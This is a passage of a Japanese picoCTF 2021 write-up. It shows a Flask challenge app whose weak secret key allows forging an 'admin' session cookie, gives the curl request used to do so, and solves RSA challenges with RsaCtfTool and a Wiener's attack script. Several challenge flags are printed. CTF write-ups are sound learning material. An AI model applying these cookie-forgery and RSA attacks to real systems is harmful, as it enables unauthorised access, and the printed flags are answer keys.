</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">session</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_value</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">=</span> <span class="s2">&#34;Most Cookies&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">cookie_names</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;snickerdoodle&#34;</span><span class="p">,</span> <span class="s2">&#34;chocolate chip&#34;</span><span class="p">,</span> <span class="s2">&#34;oatmeal raisin&#34;</span><span class="p">,</span> <span class="s2">&#34;gingersnap&#34;</span><span class="p">,</span> <span class="s2">&#34;shortbread&#34;</span><span class="p">,</span> <span class="s2">&#34;peanut butter&#34;</span><span class="p">,</span> <span class="s2">&#34;whoopie pie&#34;</span><span class="p">,</span> <span class="s2">&#34;sugar&#34;</span><span class="p">,</span> <span class="s2">&#34;molasses&#34;</span><span class="p">,</span> <span class="s2">&#34;kiss&#34;</span><span class="p">,</span> <span class="s2">&#34;biscotti&#34;</span><span class="p">,</span> <span class="s2">&#34;butter&#34;</span><span class="p">,</span> <span class="s2">&#34;spritz&#34;</span><span class="p">,</span> <span class="s2">&#34;snowball&#34;</span><span class="p">,</span> <span class="s2">&#34;drop&#34;</span><span class="p">,</span> <span class="s2">&#34;thumbprint&#34;</span><span class="p">,</span> <span class="s2">&#34;pinwheel&#34;</span><span class="p">,</span> <span class="s2">&#34;wafer&#34;</span><span class="p">,</span> <span class="s2">&#34;macaroon&#34;</span><span class="p">,</span> <span class="s2">&#34;fortune&#34;</span><span class="p">,</span> <span class="s2">&#34;crinkle&#34;</span><span class="p">,</span> <span class="s2">&#34;icebox&#34;</span><span class="p">,</span> <span class="s2">&#34;gingerbread&#34;</span><span class="p">,</span> <span class="s2">&#34;tassie&#34;</span><span class="p">,</span> <span class="s2">&#34;lebkuchen&#34;</span><span class="p">,</span> <span class="s2">&#34;macaron&#34;</span><span class="p">,</span> <span class="s2">&#34;black and white&#34;</span><span class="p">,</span> <span class="s2">&#34;white chocolate macadamia&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">cookie_names</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;very_auth&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">		<span class="n">check</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="s2">&#34;blank&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="n">title</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/display&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;blank&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/search&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="s2">&#34;name&#34;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="ow">in</span> <span class="n">cookie_names</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/display&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">message</span> <span class="o">=</span> <span class="s2">&#34;That doesn&#39;t appear to be a valid cookie.&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="n">category</span> <span class="o">=</span> <span class="s2">&#34;danger&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="n">flash</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">category</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;blank&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/reset&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reset</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s2">&#34;very_auth&#34;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/display&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;very_auth&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">		<span class="n">check</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;flag.html&#34;</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">flag_value</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="n">title</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">		<span class="n">flash</span><span class="p">(</span><span class="s2">&#34;That is a cookie! Not very special though...&#34;</span><span class="p">,</span> <span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;not-flag.html&#34;</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="n">title</span><span class="p">,</span> <span class="n">cookie_name</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="n">session</span><span class="p">[</span><span class="s2">&#34;very_auth&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;blank&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<h3 id="solution-7">Solution</h3>
<p>コードを読み解くと、sessionクッキーに <code>&quot;{'very_auth': 'admin'}&quot;</code> をセットしてあげればいい感じです。</p>
<p>secret keyは、いくつかあるcookie名のどれかひとつなので、全パターン試す方針でいきました。</p>
<p>エンコードには、以下のツールを使いました。<br />
<a href="https://noraj.github.io/flask-session-cookie-manager/">https://noraj.github.io/flask-session-cookie-manager/</a></p>
<p>以下をやったときに、フラグが取れました。</p>
<pre>
curl -v -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGMnjQ.YRj4FLiReh9G5jImp_z4_ksNXFY" http://mercury.picoctf.net:65344/display
</pre>
<br />
<p>Flag: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="crypto-mind-your-ps-and-qs-20-points">[Crypto]: Mind your Ps and Qs (20 points)</h2>
<hr>
<h3 id="challenge-8">Challenge</h3>
<blockquote>
<p>In RSA, a small e value can be problematic, but what about N? Can you decrypt this? values
<br /><br />
Values:<br />
Decrypt my super sick RSA:<br />
c: 62324783949134119159408816513334912534343517300880137691662780895409992760262021<br />
n: 1280678415822214057864524798453297819181910621573945477544758171055968245116423923<br />
e: 65537</p>
</blockquote>
<br />
<h3 id="solution-8">Solution</h3>
<pre>
$ RsaCtfTool.py -n 1280678415822214057864524798453297819181910621573945477544758171055968245116423923 -e 65537 --uncipher 62324783949134119159408816513334912534343517300880137691662780895409992760262021
[+] Clear text : b'\x00picoCTF{sma11_N_n0_g0od_05012767}'
</pre>
<br />
<p>Flag: <code>picoCTF{sma11_N_n0_g0od_05012767}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="crypto-mini-rsa-70-points">[Crypto]: Mini RSA (70 points)</h2>
<hr>
<h3 id="challenge-9">Challenge</h3>
<blockquote>
<p>What happens if you have a small exponent? There is a twist though, we padded the plaintext so that (M ** e) is just barely larger than N. Let&rsquo;s decrypt this: ciphertext</p>
</blockquote>
<br />
<h3 id="solution-9">Solution</h3>
<p>これも RsaCtfTool.py で解けました。</p>
<br />
<p>Flag: <code>picoCTF{e_sh0u1d_b3_lArg3r_6e2e6bda}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="crypto-dachshund-attacks-80-points">[Crypto]: Dachshund Attacks (80 points)</h2>
<hr>
<h3 id="challenge-10">Challenge</h3>
<blockquote>
<p>What if d is too small? Connect with nc mercury.picoctf.net 36463.
<br /><br />
Hint1: What do you think about my pet? dachshund.jpg</p>
</blockquote>
<pre>
$ nc mercury.picoctf.net 36463
Welcome to my RSA challenge!
e: 51537241764217253336345243311947713349968154199629189420157791436090484980202646181796053644360119963893952439517397387647017579509149211949359554937724767469698141776524467766769342433272225705039609292625524425456728627405240349489519425394684117442350460638749566715146334995284556849251272359311384375471
n: 97898927176062501432192701500578400140380522846944393428134289284776849545743699261607906303291030297744139365338020081188743685611075849612951429157738895287000243531804108300250808832527224707218317655911899492161762533016486603095747039144712499867199366218631152052998452387165136335660726462544926693081
c: 67457181885150124304023419649124675286255007819125635338936395085652015523669117126061198023228949491008135664753666447629036803602744839291943812720732475661169267477075392733551150940443733190801167395263239701617897840753295515554415410443666195318993811717090316627235081075422679422940861478484402552155
</pre>
<br />
<h3 id="solution-10">Solution</h3>
<p>ググってみたら、dが小さいRSAのやつは、Wiener&rsquo;s attackというらしいです。</p>
<blockquote>
<p>英語から翻訳-暗号学者のMichael J. Wienerにちなんで名付けられたウィーナーの攻撃は、RSAに対する一種の暗号攻撃です。攻撃は、継続分数法を使用して、dが小さいときに秘密鍵dを公開します。</p>
</blockquote>
<p>以下のツールを使わせてもらいました。<br />
<a href="https://github.com/orisano/owiener">https://github.com/orisano/owiener</a></p>
<br />
- dachshund_solve.py
```Python
import owiener
<p>e = 51537241764217253336345243311947713349968154199629189420157791436090484980202646181796053644360119963893952439517397387647017579509149211949359554937724767469698141776524467766769342433272225705039609292625524425456728627405240349489519425394684117442350460638749566715146334995284556849251272359311384375471
n = 97898927176062501432192701500578400140380522846944393428134289284776849545743699261607906303291030297744139365338020081188743685611075849612951429157738895287000243531804108300250808832527224707218317655911899492161762533016486603095747039144712499867199366218631152052998452387165136335660726462544926693081
c = 67457181885150124304023419649124675286255007819125635338936395085652015523669117126061198023228949491008135664753666447629036803602744839291943812720732475661169267477075392733551150940443733190801167395263239701617897840753295515554415410443666195318993811717090316627235081075422679422940861478484402552155
d = owiener.attack(e, n)</p>
<p>if d is None:
print(&ldquo;Failed&rdquo;)
else:
hex_string = hex(pow(c,d,n))
hex_string = hex_string[2::] # To remove &ldquo;0x&rdquo;
print(bytearray.fromhex(hex_string).decode())</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;pre&gt;
</span></span><span class="line"><span class="cl">$ python dachshund_solve.py 
</span></span><span class="line"><span class="cl">picoCTF{proving_wiener_2635457}
</span></span><span class="line"><span class="cl">&lt;/pre&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Flag: `picoCTF{proving_wiener_2635457}`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">## [Crypt]: Pixelated (200 points)
</span></span><span class="line"><span class="cl">- - -
</span></span><span class="line"><span class="cl">### Challenge
</span></span><span class="line"><span class="cl">&gt; I have these 2 images, can you make a flag out of them? scrambled1.png scrambled2.png
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">Hint1: https://en.wikipedia.org/wiki/Visual_cryptography
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">Hint2: Think of different ways you can &#34;stack&#34; images
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### Solution
</span></span><span class="line"><span class="cl">ImageMagickのcompositeをいろいろ試していったら、addでフラグが出ました。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;pre&gt;
</span></span><span class="line"><span class="cl"> $ composite -compose plus scrambled1.png scrambled2.png out.png
</span></span><span class="line"><span class="cl"> $ composite -compose over scrambled1.png scrambled2.png out.png
</span></span><span class="line"><span class="cl"> $ composite -compose multiply scrambled1.png scrambled2.png out.png
</span></span><span class="line"><span class="cl"> $ composite -compose screen scrambled1.png scrambled2.png out.png
</span></span><span class="line"><span class="cl"> $ composite -compose add scrambled1.png scrambled2.png out.png
</span></span><span class="line"><span class="cl">&lt;/pre&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;img src=&#34;https://captureamerica.github.io/writeups/img/picoctf_2021_Pixelated.png&#34; alt=&#34;picoctf_2021_Pixelated.png&#34;&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Flag: `picoCTF{1b867c3e}`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">## [Reverse]: Transformation (20 points)
</span></span><span class="line"><span class="cl">- - -
</span></span><span class="line"><span class="cl">### Challenge
</span></span><span class="line"><span class="cl">&gt; I wonder what this really is... enc &#39;&#39;.join([chr((ord(flag[i]) &lt;&lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">Hint: You may find some decoders online
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### Solution
</span></span><span class="line"><span class="cl">&#34;unicode decoder&#34;でググってヒットした最初のやつ（以下）を使わせてもらいました。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">https://r12a.github.io/app-conversion/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;pre&gt;
</span></span><span class="line"><span class="cl">7069 636F 4354 467B 3136 5F62 6974 735F 696E 7374 3334 645F 6F66 5F38 5F30 3463 3037 3630 647D
</span></span><span class="line"><span class="cl">&lt;/pre&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Flag: `picoCTF{16_bits_inst34d_of_8_04c0760d}`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
